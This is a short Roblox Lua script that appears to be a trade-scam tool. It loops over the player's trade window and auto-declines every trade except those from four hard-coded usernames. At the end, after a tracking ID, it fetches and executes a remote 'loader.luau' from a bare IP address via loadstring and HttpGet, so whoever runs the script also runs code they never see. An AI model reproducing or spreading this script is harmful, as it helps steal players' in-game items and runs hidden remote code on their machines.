aprplayers = {
    "Guest194827461",
    "skibiditolet2018",
    "typazveer",
    "dontsubay1",
}

local function normalizeName(name)
    return string.gsub(name, "[()%[%]{}]", "")
end

local player = game.Players.LocalPlayer
local function isAllowed(name)
    for _, allowed in ipairs(aprplayers) do
        if name == allowed then
            return true
        end
    end
    return false
end
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local destroyTrades = coroutine.create(function()
    while true do
        local playerGui = player:WaitForChild("PlayerGui")
        local tradeGUI = playerGui:FindFirstChild("TradeGUI_Phone")

        if tradeGUI then
            local theirOffer = tradeGUI:FindFirstChild("Container")
                and tradeGUI.Container:FindFirstChild("Trade")
                and tradeGUI.Container.Trade:FindFirstChild("TheirOffer")

            if theirOffer and theirOffer:FindFirstChild("Username") then
                local usernameText = theirOffer.Username.Text
                local cleanName = normalizeName(usernameText)

                if not isAllowed(cleanName) then
                    -- Ник не разрешён → отклоняем трейд
                    local args = {}
                    ReplicatedStorage:WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer(unpack(args))
                end
            end
        end

        task.wait(0.1)
    end
end)

coroutine.resume(destroyTrades)


ID="c9e158cf-1211-4fbc-a704-206afd021c35";
loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
